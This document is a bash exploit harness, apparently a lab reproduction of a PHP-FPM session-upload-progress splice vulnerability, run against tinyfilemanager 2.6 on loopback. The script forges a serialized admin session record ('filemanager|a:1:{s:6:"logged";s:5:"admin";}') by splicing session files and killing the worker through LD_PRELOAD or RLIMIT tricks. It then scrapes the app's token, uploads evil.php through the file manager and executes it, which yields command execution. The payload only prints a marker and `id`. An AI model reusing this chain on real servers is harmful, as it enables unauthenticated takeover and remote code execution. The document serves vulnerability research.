#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) UNAUTHENTICATED splice, real-app
# consumer lane: tinyfilemanager 2.6 on loopback FastCGI. Same rfc1867
# carrier/replacement/kill geometry as php2shell-aftershell-splice-drupal.sh
# (wake 58), but the consumer is an application whose ENTIRE auth state is
# the native php session:
#   promoted record  filemanager|a:1:{s:6:"logged";s:5:"admin";}
# tinyfilemanager.php:352 accepts $_SESSION['filemanager']['logged'] when
# it is a key of $auth_users ('admin' is, default config) — no cookie
# token, no DB, no re-verification. From there the app's DESIGNED admin
# function is file management: upload evil.php through the app's own
# upload form (no extension allowlist by default, token scraped from the
# logged-in page) and request it; the live FPM worker executes the
# lab-chosen benign payload (unique marker print + `id` into the
# response and a marker file inside the lab tmpdir).
#
# Death modes: shim = LD_PRELOAD partial-write SIGKILL (rung-4 mechanics);
# rlimit = no phase-2 preload, deployment RLIMIT_FSIZE short write plus an
# optional wire-driven RLIMIT_CPU worker death (PREBURN=1). Calibration still
# uses the shim in LOG_ONLY mode; it cannot kill in phase 1.
# Differences from the Drupal harness, all forced by the consumer app:
# - session.use_cookies = 1 (tinyfilemanager never calls session_id();
#   PHP 8.4 ignores incoming cookie ids with use_cookies=0). Producers
#   still ride the multipart PHPSESSID form field (use_only_cookies=0).
# - the consumer cookie name is 'filemanager' (the app renames the
#   session at runtime; the pre-RINIT rfc1867 machinery still uses the
#   INI name PHPSESSID, as in the Drupal lane).
# - consumer needs QUERY_STRING=p= (the app redirects otherwise) and
#   HTTP_HOST.
#
# Usage: DEATH_MODE=rlimit PREBURN=1 bash lab/repro/php2shell-aftershell-splice-tfm.sh <php-fpm-bin> <tfm-web> [outdir] [port]
#   Optional attacker-byte variance: SID=<32 hex> FILLER=<one byte>.
#   GAP=1 tests a second unlimited consumer pool during the producer's unlock gap.

set -u
DEATH_MODE=${DEATH_MODE:-shim}
[ "$DEATH_MODE" = shim ] || [ "$DEATH_MODE" = rlimit ] || { echo "DEATH_MODE must be shim or rlimit"; exit 2; }
NATIVE_ATTACK=0
GAP=${GAP:-0}
[ "$GAP" = 0 ] || [ "$DEATH_MODE" = rlimit ] || { echo "GAP=1 requires DEATH_MODE=rlimit"; exit 2; }
if [ -z "${DISPLAY_ERRORS+x}" ]; then DISPLAY_ERRORS=1; [ "$DEATH_MODE" = rlimit ] && DISPLAY_ERRORS=0; fi
if [ "$GAP" = 1 ]; then
    PROGRESS_FREQ=${PROGRESS_FREQ:-100%}
    ARMED_BYTES=${ATTACK_BYTES:-8388608}
    ARMED_TRAIL_BYTES=${TRAIL_BYTES:-134217728}
elif [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ]; then
    PROGRESS_FREQ=${PROGRESS_FREQ:-100%}
    ARMED_BYTES=${ATTACK_BYTES:-8388608}
    ARMED_TRAIL_BYTES=${TRAIL_BYTES:-134217728}
else
    PROGRESS_FREQ=${PROGRESS_FREQ:-1%}
    ARMED_BYTES=${ATTACK_BYTES:-8192}
    ARMED_TRAIL_BYTES=0
fi
TRAIL_BYTES=0
FPM=$(readlink -f "$1")
WEB=$(readlink -f "$2")
FPM_VERSION=$("$FPM" -v | sed -n 's/^PHP \([0-9][0-9.]*\).*/\1/p')
APP_HEALTH=0
if [ "$(printf '%s\n' 8.4.28 "$FPM_VERSION" | sort -V | head -n 1)" = 8.4.28 ]; then
    APP_HEALTH=1
fi
OUT=${3:-lab/build/evidence}
PORT=${PORT:-${4:-18134}}
CPORT=$((PORT + 1))
BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')-tfm
CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
[ -f "$WEB/index.php" ] || { echo "no tinyfilemanager at $WEB (run provision-tfm-app.sh)"; exit 1; }
mkdir -p "$OUT"
LOG="$OUT/aftershell-tfm-$LABEL.log"
: > "$LOG"
SCRIPT_SHA=$(sha256sum "$0"); SCRIPT_SHA=${SCRIPT_SHA%% *}
echo "runtime: $FPM_VERSION binary=$FPM kernel=$(uname -r) mode=$DEATH_MODE preburn=${PREBURN:-0} script_sha256=$SCRIPT_SHA" >> "$LOG"

REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
SO="$REPOROOT/lab/preload/aftershell-kill.so"
mkdir -p "$REPOROOT/lab/preload"
cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
    echo "cc failed"; exit 1; }

D=$(mktemp -d)
MTAG=${MTAG:-php2shell-r5-$(date -u +%H%M%S)}
MARKER="$D/rce-marker-$MTAG.txt"
MPID=
MPID2=
cleanup() { stop_fpm; [ -n "$MPID2" ] && kill "$MPID2" 2>/dev/null; [ -n "${KEEP_TMP:-}" ] || rm -rf "$D"; }
trap cleanup EXIT
SESS="$D/sess"; mkdir -p "$SESS"
FPMCONF="$D/fpm.conf"
SID=${SID:-deadbeef00112233445566778899aabb}
DUMP="$D/pwrites.bin"
ARM="$D/armed"
APPSID=
KA2=""
GAP_UPLOAD_DONE=0
BOUNDARY='---------------------------20896060251896012921717172737'
HOST=127.0.0.1

OBJ='filemanager|a:1:{s:6:"logged";s:5:"admin";}'
FILLER=${FILLER:-X}
[ "${#FILLER}" = 1 ] || { echo "FILLER must be one byte"; exit 2; }
X700=$(head -c 700 /dev/zero | tr '\0' "$FILLER")
rm -f "$WEB/evil.php"
EVIL="$D/evil.php"
cat > "$EVIL" <<EOF
<?php
echo "PHP2SHELL-R5-MARKER:$MTAG\n";
echo shell_exec('id');
file_put_contents('$MARKER', "executed by pid ".getmypid()."\n".shell_exec('id'));
EOF
EVILLEN=$(wc -c < "$EVIL")

# ---------------------------------------------------------------- FPM config
cat > "$D/fpm.conf" <<EOF
[global]
error_log = $D/fpm-error.log
daemonize = no
log_level = notice
process_control_timeout = 5
pid = $D/fpm.pid

[www]
listen = 127.0.0.1:$PORT
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
php_admin_value[html_errors] = 0
php_admin_value[display_errors] = $DISPLAY_ERRORS
php_admin_value[error_reporting] = 32767
php_admin_value[post_max_size] = 1G
php_admin_value[max_file_uploads] = 20
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 8M
php_admin_value[memory_limit] = 512M
php_admin_value[session.save_handler] = files
php_admin_value[session.save_path] = $SESS
php_value[session.name] = PHPSESSID
php_admin_value[session.serialize_handler] = php
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 1
php_admin_value[session.use_only_cookies] = 0
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = $PROGRESS_FREQ
php_admin_value[session.upload_progress.min_freq] = 0.000000001
EOF
{ echo "--- generated fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end fpm.conf ---"; } >> "$LOG"
echo "tfm consumer cookie: filemanager=$SID (host $HOST) marker=$MARKER" | tee -a "$LOG"

# ---------------------------------------------------------------- helpers
fcgi() { python3 "$CLIENT" "${CF_PORT:-$PORT}" "$@"; }
offset_of() {
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); print(d.find(sys.argv[2].encode()))' "$1" "$2"
}
seg_after() {
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); i=d.find(sys.argv[2].encode())
sys.stdout.buffer.write(d[i:] if i>=0 else b"")' "$1" "$2"
}
esc_fn() { printf %s "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
mpbody() { # $1 = progress key, $2 = raw filename, $3 = upload bytes
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n" "$BOUNDARY" "$(esc_fn "$2")"
    head -c "$3" /dev/zero | tr '\0' 'U'
    if [ "${TRAIL_BYTES:-0}" -gt 0 ]; then
        printf "\r\n--%s\r\nContent-Disposition: form-data; name=\"burn\"\r\n\r\n" "$BOUNDARY"
        head -c "$TRAIL_BYTES" /dev/zero
    fi
    printf "\r\n--%s--\r\n" "$BOUNDARY"
}
post() { # $1 = progress key, $2 = raw filename -> a REAL tinyfilemanager request (no cookie)
    mpbody "$1" "$2" "${POST_BYTES:-8192}" > "$D/body"
    python3 "$CLIENT" "$PORT" "$WEB/index.php" --body "$D/body" \
        --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
        --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
}
consumer() { # $1 = tag, $2 = sid (default attacker sid) -> tinyfilemanager GET as its own consumer
    local csid=${2:-$SID}
    fcgi "$WEB/index.php" \
        --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
        --param HTTP_USER_AGENT=php2shell-lab \
        --param HTTP_COOKIE="filemanager=$csid"
}
uploadbody() { # $1 = token
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"p\"\r\n\r\n\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"fullpath\"\r\n\r\nevil.php\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"dzchunkindex\"\r\n\r\n0\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"dztotalchunkcount\"\r\n\r\n0\r\n" "$BOUNDARY"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.php\"\r\nContent-Type: application/octet-stream\r\n\r\n" "$BOUNDARY"
    cat "$EVIL"
    printf "\r\n--%s--\r\n" "$BOUNDARY"
}
upload() { # $1 = token
    uploadbody "$1" > "$D/ubody"
    fcgi "$WEB/index.php" --body "$D/ubody" \
        --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
        --param HTTP_USER_AGENT=php2shell-lab \
        --param HTTP_COOKIE="filemanager=${APPSID:-$SID}" \
        --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
}
execute_uploaded() { # GET /evil.php through the same FPM worker
    fcgi "$WEB/evil.php" \
        --param "QUERY_STRING=" --param "REQUEST_URI=/evil.php" \
        --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST
}
wait_port() {
python3 - "$1" <<'PY'
import socket, sys, time
port = int(sys.argv[1])
for _ in range(100):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            sys.exit(0)
    except OSError:
        time.sleep(0.1)
sys.exit(1)
PY
}
child_pids() { pgrep -P "$MPID" 2>/dev/null || true; }
worker_cpu_ticks() {
    python3 -c 'import sys
s=open(f"/proc/{sys.argv[1]}/stat").read(); f=s[s.rfind(")")+2:].split()
print(int(f[11])+int(f[12]))' "$1"
}
wait_child() {
    local i c
    for i in $(seq 1 100); do
        c=$(child_pids)
        if [ "$(echo "$c" | grep -c .)" = 1 ]; then echo "$c"; return 0; fi
        sleep 0.1
    done
    return 1
}
start_fpm() {
    stop_fpm
    fuser -k "$PORT"/tcp >/dev/null 2>&1 || true
    sleep 0.2
    (
        if [ "$NATIVE_ATTACK" = 0 ]; then
            export LD_PRELOAD="$SO" \
                   AFTERSHELL_LOG_FILE="$DUMP" AFTERSHELL_LOG_ONLY=1
        else
            unset LD_PRELOAD AFTERSHELL_LOG_FILE AFTERSHELL_LOG_ONLY
        fi
        echo "FPM start: native_attack=$NATIVE_ATTACK ld_preload=${LD_PRELOAD:-unset} log_only=${AFTERSHELL_LOG_ONLY:-unset}" >> "$LOG"
        if [ -n "$KA2" ]; then
            export AFTERSHELL_KILL_AT="$KA2" AFTERSHELL_KILL_ARM="$ARM"
        fi
        exec "$FPM" -n -F -y "$FPMCONF"
    ) >> "$LOG" 2>&1 &
    MPID=$!
    wait_port "$PORT" || { echo "FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
    CHILD=$(wait_child) || { echo "no worker child — inspect $LOG" | tee -a "$LOG"; exit 1; }
}
stop_fpm() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    MPID=
}
start_consumer_fpm() {
    sed -e 's|^listen = 127\.0\.0\.1:.*|listen = 127.0.0.1:'"$CPORT"'|' \
        -e 's|^pid = .*|pid = '"$D"'/fpm-consumer.pid|' \
        -e 's|^php_admin_value\[session.upload_progress.enabled\] = 1$|php_admin_value[session.upload_progress.enabled] = 0|' \
        "$FPMCONF" > "$D/fpm-consumer.conf"
    (
        unset LD_PRELOAD AFTERSHELL_LOG_FILE AFTERSHELL_LOG_ONLY AFTERSHELL_KILL_AT AFTERSHELL_KILL_ARM
        exec "$FPM" -n -F -y "$D/fpm-consumer.conf"
    ) >> "$LOG" 2>&1 &
    MPID2=$!
    wait_port "$CPORT" || { echo "consumer FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
    echo "consumer pool master pid=$MPID2 port=$CPORT (upload_progress off, no limits)" | tee -a "$LOG"
}

# ---------------------------------------------------------------- carrier
# C = carrrec || objkrec(PAD+OBJ+PAD3 in filename) || tailrec;
# R = carrnew(long filename) || objkrec || tailrec, len(R) > len(C) so
# mod_files.c skips the truncate; cut K = len(carrnew).
build_carrier() { # $1 = PAD length before OBJ inside objk's filename
    rm -f "$SESS"/sess_* "$WEB/evil.php"
    local pad fn
    pad=$(head -c "$1" /dev/zero | tr '\0' 'A')
    fn="$pad$OBJ$(head -c 32 /dev/zero | tr '\0' 'B')"
    post carr "z"   >> "$LOG" 2>&1
    post objk "$fn" >> "$LOG" 2>&1
    post tail "z"   >> "$LOG" 2>&1
}

# ================================= phase 1: calibration + carrier alignment
start_fpm
echo "== FPM phase-1 master pid=$MPID label=$LABEL build=$BUILDDIR child=$CHILD $(date -u)" >> "$LOG"

build_carrier 100
rm -f "$DUMP"
TRAIL_BYTES=$ARMED_TRAIL_BYTES
POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
TRAIL_BYTES=0
K=$(python3 -c 'import sys
d=open(sys.argv[1],"rb").read()
i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1
print(d.find(b"upload_progress_objk|", j) - j)' "$DUMP")
NW=$(python3 -c 'import re,sys
d=open(sys.argv[1],"rb").read(); m=re.search(rb"=== pwrite n=(\d+) ===",d)
print(m.group(1).decode() if m else "0")' "$DUMP")
echo "calibration: FILE_START write n=$NW, K(len of carrnew record)=$K" >> "$LOG"
if [ "$K" -le 0 ]; then
    echo "calibration FAILED (no objk record in FILE_START dump — inspect $LOG)" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

PADLEN=100
build_carrier "$PADLEN"
for i in 1 2 3 4 5 6; do
    M1=$(offset_of "$SESS/sess_$SID" 'filemanager|a:1:')
    DELTA=$((K - M1))
    echo "align pass $i: OBJ at $M1, target K=$K, delta=$DELTA (PAD1=$PADLEN)" >> "$LOG"
    [ "$DELTA" -eq 0 ] && break
    PADLEN=$((PADLEN + DELTA))
    build_carrier "$PADLEN"
done
M1=$(offset_of "$SESS/sess_$SID" 'filemanager|a:1:')
if [ "$M1" != "$K" ]; then
    echo "ALIGNMENT FAILED: OBJ at $M1, want $K — inspect $LOG" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi
CARRIER="$D/carrier.bin"
cp "$SESS/sess_$SID" "$CARRIER"
echo "carrier aligned: OBJ at byte $M1 == K=$K, carrier size $(wc -c < "$CARRIER")" >> "$LOG"
LENR=$((NW))
LEN_C=$(wc -c < "$CARRIER")
echo "variant-A check: len(R_fs)=$LENR vs carrier size $LEN_C (must be >= or mod_files.c truncates first)" >> "$LOG"
if [ "$LENR" -lt "$LEN_C" ]; then
    echo "   len(R) < len(C) — harness invalid: pad the replacement filename" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

# sanity: the tfm consumer must start a session on a virgin sid
rm -f "$DUMP"
printf 'probe|a:1:{s:1:"x";i:1;}' > "$SESS/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
consumer SANITY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> "$LOG" 2>&1
SAN_PID=$(grep -c '=== pwrite' "$DUMP" 2>/dev/null || echo 0)
echo "sanity consumer: pwrite-dump entries=$SAN_PID (session write by the app)" >> "$LOG"

stop_fpm

# ================================= phase 2: interrupted write + respawn + consumer
if [ "$DEATH_MODE" = rlimit ]; then
    NATIVE_ATTACK=1
    KA2=""
else
    KA2="$K"
fi
start_fpm
OLDCHILD=$CHILD
echo "== FPM phase-2 master pid=$MPID mode=$DEATH_MODE boundary=$K child=$OLDCHILD" >> "$LOG"
if [ "$DEATH_MODE" = rlimit ]; then
    if [ "${PREBURN:-0}" = 1 ] && [ "$GAP" = 0 ]; then
        TARGET_SID=$SID
        SID=00112233445566778899aabbccddeeff
        HZ=$(getconf CLK_TCK)
        COARSE_TICKS=$((HZ * 90 / 100))
        TARGET_TICKS=$((HZ * ${PREBURN_TARGET:-98} / 100))
        TICKS=$(worker_cpu_ticks "$OLDCHILD")
        COARSE_N=0
        for BURN_N in $(seq 1 400); do
            [ "$TICKS" -ge "$COARSE_TICKS" ] && break
            POST_BYTES=${BURN_BYTES:-4194304} post carr "$X700" > "$D/preburn.out" 2>&1
            COARSE_N=$BURN_N
            TICKS=$(worker_cpu_ticks "$OLDCHILD")
        done
        [ "$TICKS" -ge "$COARSE_TICKS" ] || { echo "CPU coarse preburn failed" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
        FINE_N=0
        while [ "$TICKS" -lt "$TARGET_TICKS" ] && [ "$FINE_N" -lt 400 ]; do
            POST_BYTES=${FINE_BURN_BYTES:-65536} post carr "$X700" > "$D/preburn.out" 2>&1
            FINE_N=$((FINE_N + 1))
            TICKS=$(worker_cpu_ticks "$OLDCHILD")
        done
        SID=$TARGET_SID
        CPU_SEC=$((TICKS / HZ))
        CPU_REM=$((TICKS % HZ))
        if [ "$CPU_REM" -lt 97 ] || [ "$CPU_REM" -gt 99 ]; then
            echo "CPU fine preburn missed safe arming window: ticks=$TICKS rem=$CPU_REM" | tee -a "$LOG"
            KEEP_TMP=1 exit 1
        fi
        CPU_LIMIT=$((CPU_SEC + 1))
        echo "preburn: coarse_requests=$COARSE_N fine_requests=$FINE_N cpu_ticks=$TICKS hz=$HZ armed_RLIMIT_CPU=$CPU_LIMIT" >> "$LOG"
    fi
    prlimit --pid "$OLDCHILD" --fsize="$K:$K" >> "$LOG" 2>&1 || {
        echo "failed to set worker RLIMIT_FSIZE" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
    prlimit --pid "$OLDCHILD" --fsize >> "$LOG" 2>&1
    if [ -n "${CPU_LIMIT:-}" ]; then
        prlimit --pid "$OLDCHILD" --cpu="$CPU_LIMIT:$CPU_LIMIT" >> "$LOG" 2>&1 || {
            echo "failed to set worker RLIMIT_CPU" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
        prlimit --pid "$OLDCHILD" --cpu >> "$LOG" 2>&1
    fi
else
    touch "$ARM"
fi
TRAIL_BYTES=$ARMED_TRAIL_BYTES
if [ "$GAP" = 1 ]; then
    start_consumer_fpm
    MARKPID=$(pgrep -P "$MPID2" | head -n 1)
    echo "gap consumer worker pid=$MARKPID" >> "$LOG"
    export CF_PORT=$CPORT
    rm -f "$D/splice-seen" "$D/gap-found"
    (
    python3 - "$SESS/sess_$SID" "$K" "$D/splice-seen" "$D/gap-found" "$FILLER" <<'PY' >> "$LOG" 2>&1
import os, shutil, sys, time
path, k, seen, found, filler = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5].encode()
deadline = time.monotonic() + 20
while time.monotonic() < deadline:
    try:
        with open(path, 'rb') as f:
            d = f.read(200000)
        if len(d) > k and d[k:k+16] == b'filemanager|a:1:' and d[:k].endswith(b'}') and d[:k].count(filler * 16) >= 1:
            print('gap-candidate: len=%d prefix=%r tail-at-K=%r' % (len(d), d[:24], d[k:k+40]))
            if d.startswith(b'upload_progress_carr|'):
                shutil.copyfile(path, seen)
                open(found, 'w').write(str(time.monotonic()))
                print('gap-watcher: splice seen at %d bytes, offset %d == %r' % (len(d), k, d[k:k+40]))
                sys.exit(0)
    except OSError:
        pass
print('gap-watcher: no splice within 20s')
sys.exit(1)
PY
    ) &
    WATCHPID=$!
    POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1 &
    PRODPID=$!
    wait "$WATCHPID"; GAP_FOUND=$?
    if [ "$GAP_FOUND" = 0 ]; then
        echo "gap-watcher: firing consumer on port $CPORT while producer request $PRODPID is live" | tee -a "$LOG"
    else
        echo "gap-watcher: no splice window; consumer still fired as negative control" | tee -a "$LOG"
    fi
    consumer GAP > "$D/consumerA.out" 2>&1
    cat "$D/consumerA.out" >> "$LOG"
    GAP_TOKEN=$(python3 -c 'import re,sys
d=open(sys.argv[1],"r",errors="replace").read()
m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"", d)
print(m.group(1) if m else "")' "$D/consumerA.out")
    if [ -n "$GAP_TOKEN" ]; then
        upload "$GAP_TOKEN" > "$D/upload.out" 2>&1
        GAP_UPLOAD_DONE=1
        echo "gap: admin upload fired with token $GAP_TOKEN while producer request $PRODPID is live" | tee -a "$LOG"
    fi
    wait "$PRODPID"; RC=$?
else
    POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
    RC=$?
fi
ATTACK_FILE="$SESS/sess_$SID"
if [ -f "$ATTACK_FILE" ]; then
    FILESZ=$(wc -c < "$ATTACK_FILE")
else
    FILESZ=0
fi
echo "attack-run rc=$RC file-after-run: $FILESZ bytes" >> "$LOG"
ls -l "$SESS" >> "$LOG" 2>&1
if [ -f "$ATTACK_FILE" ]; then
    echo "  bytes-K-onward: $(seg_after "$ATTACK_FILE" 'filemanager|a:1:' | head -c 60)" >> "$LOG"
fi

NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
echo "master worker after run: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — CPU death may not have fired" >> "$LOG"
DEATH_OK=1
if [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ] && [ "$GAP" = 0 ]; then
    DEATH_OK=0
    if [ "$NEWCHILD" != "$OLDCHILD" ] && grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null; then
        DEATH_OK=1
    fi
    echo "producer-death-check: old=$OLDCHILD new=$NEWCHILD signal9=$(grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null && echo yes || echo no) ok=$DEATH_OK" >> "$LOG"
fi

MIXOK=0
SPLICE_FILE=$ATTACK_FILE
[ "$GAP" = 1 ] && [ -f "$D/splice-seen" ] && SPLICE_FILE="$D/splice-seen"
if [ -f "$SPLICE_FILE" ]; then
    python3 - "$SPLICE_FILE" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
import sys
f = open(sys.argv[1], 'rb').read()
c = open(sys.argv[2], 'rb').read()
k = int(sys.argv[3])
prefix_ok = f[:k].startswith(b'upload_progress_carr|a:') and f[:k].endswith(b'}')
tail_ok = len(f) > k and f[k:] == c[k:]
boundary_ok = f[k:k+44].startswith(b'filemanager|a:1:')
ok = prefix_ok and tail_ok and boundary_ok
print(f"splice-check: filelen={len(f)} K={k} new-record-prefix:{prefix_ok} tail==carrier-tail:{tail_ok} obj-at-K:{f[k:k+44][:24]!r}")
sys.exit(0 if ok else 1)
EOF
else
    echo "splice-check: attacker session file absent" >> "$LOG"
fi
[ "$MIXOK" = 1 ] && echo "  post-run file state: k1new || C[K:] splice on disk" >> "$LOG" \
               || echo "  post-run file state: NOT the splice (8.4.28: expected)" >> "$LOG"
[ "$FILESZ" = "$K" ] && echo "  (file size == K: ftruncate-first — vendor-fix behavior)" >> "$LOG"

# PHP 8.4.28+ rejects tinyfilemanager's runtime session ini change while
# upload_progress is On. Keep the producer pool vulnerable for the attack,
# then use an upload_progress-off pool with the same save_path for app checks.
if [ "$APP_HEALTH" = 1 ] && [ "$GAP" = 0 ]; then
    sed 's/^php_admin_value\[session.upload_progress.enabled\] = 1$/php_admin_value[session.upload_progress.enabled] = 0/' "$FPMCONF" > "$D/fpm-health.conf"
    stop_fpm
    FPMCONF="$D/fpm-health.conf"
    start_fpm
    echo "== FPM app-health pool master pid=$MPID child=$CHILD (upload_progress off)" >> "$LOG"
fi

# ---- consumer: RESPAWNED worker runs the REAL tinyfilemanager request
# with the spliced session; the app's own session decode is the consume path.
if [ "$GAP" = 0 ]; then
    rm -f "$DUMP"
    consumer A > "$D/consumerA.out" 2>&1
    cat "$D/consumerA.out" >> "$LOG"
fi
PROMOTED=0
if [ "$NATIVE_ATTACK" = 0 ]; then
    python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && PROMOTED=1
import sys
d = open(sys.argv[1], 'rb').read()
ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d   # record-boundary promotion, not inert string content
print(f"consumer-write-dump: promoted-evil-record:{ok} ({len(d)} bytes dumped)")
sys.exit(0 if ok else 1)
EOF
    [ "$PROMOTED" = 1 ] && echo "   tfm consumer session WRITE re-encoded the promoted admin record" | tee -a "$LOG" \
                       || echo "   consumer write dump has NO evil record (see $LOG)" | tee -a "$LOG"
else
    PROMOTED=2
    echo "   native attack: no LD_PRELOAD; session promotion is assessed by the app response below" >> "$LOG"
fi

TAKEOVER=0
TOKEN=$(python3 -c 'import re,sys
d=open(sys.argv[1],"r",errors="replace").read()
m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"", d)
print(m.group(1) if m else "")' "$D/consumerA.out")
if [ -n "$TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerA.out"; then
    TAKEOVER=1
    echo "   SESSION TAKEOVER: tinyfilemanager accepted the promoted session as user 'admin' (token $TOKEN)" | tee -a "$LOG"
else
    echo "   no takeover: login form, no token (8.4.28/no-kill: expected)" | tee -a "$LOG"
fi
if [ "$GAP" = 1 ] && [ "$TAKEOVER" = 1 ]; then
    NEWSID=$(python3 -c 'import re,sys
d=open(sys.argv[1],"r",errors="replace").read()
m=re.search(r"Set-Cookie: filemanager=([0-9a-f]+)", d)
print(m.group(1) if m else "")' "$D/consumerA.out")
    if [ -n "$NEWSID" ]; then
        APPSID=$NEWSID
        echo "gap: app regenerated session id $APPSID; use it for the admin upload" | tee -a "$LOG"
    fi
fi

# ---- designed admin action: upload evil.php through the app's own form
EXECOK=0
MARKER_OK=0
if [ "$TAKEOVER" = 1 ]; then
    [ "$GAP_UPLOAD_DONE" = 1 ] || upload "$TOKEN" > "$D/upload.out" 2>&1
    cat "$D/upload.out" >> "$LOG"
    if grep -q '"status":"success"' "$D/upload.out"; then
        echo "   admin UPLOAD accepted by the app: $WEB/evil.php" | tee -a "$LOG"
        execute_uploaded > "$D/exec.out" 2>&1
        cat "$D/exec.out" >> "$LOG"
        if grep -q "PHP2SHELL-R5-MARKER:$MTAG" "$D/exec.out" && grep -q "uid=" "$D/exec.out"; then
            EXECOK=1
            echo "   COMMAND EXECUTION by the live worker: marker $MTAG printed, \`id\` output:" | tee -a "$LOG"
            grep "uid=" "$D/exec.out" | tee -a "$LOG"
        else
            echo "   /evil.php did NOT execute — inspect $LOG" | tee -a "$LOG"
        fi
    else
        echo "   upload REJECTED by the app — inspect $LOG" | tee -a "$LOG"
    fi
else
    upload "0" > "$D/upload.out" 2>&1
    cat "$D/upload.out" >> "$LOG"
    grep -q 'Token' "$D/upload.out" && echo "   control upload rejected (token invalid/missing), as expected" | tee -a "$LOG"
fi
MARKER_CONTENT=$(cat "$MARKER" 2>/dev/null || true)
if [ -n "$MARKER_CONTENT" ] && printf '%s\n' "$MARKER_CONTENT" | grep -q "^executed by pid ${MARKPID:-$NEWCHILD}$" && printf '%s\n' "$MARKER_CONTENT" | grep -q '^uid='; then
    MARKER_OK=1
fi
echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no) pid-bound-to-new-worker=$MARKER_OK" | tee -a "$LOG"
[ -f "$MARKER" ] && { echo "   marker file $MARKER:"; cat "$MARKER"; } >> "$LOG"
[ "$EXECOK" = 1 ] && [ "$MARKER_OK" != 1 ] && { echo "   COMMAND EXECUTION REJECTED: target marker missing or not PID-bound" | tee -a "$LOG"; EXECOK=0; }
# Preserve the positive side effect in the log, then require both controls to
# leave a fresh marker absent rather than counting the earlier positive file.
rm -f "$MARKER" "$WEB/evil.php"

# ---- control: identical carrier + replacement WITHOUT the CPU death
build_carrier "$PADLEN"
POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
echo "control-write rc=$?" >> "$LOG"
rm -f "$DUMP"
consumer CTL > "$D/consumerCTL.out" 2>&1
cat "$D/consumerCTL.out" >> "$LOG"
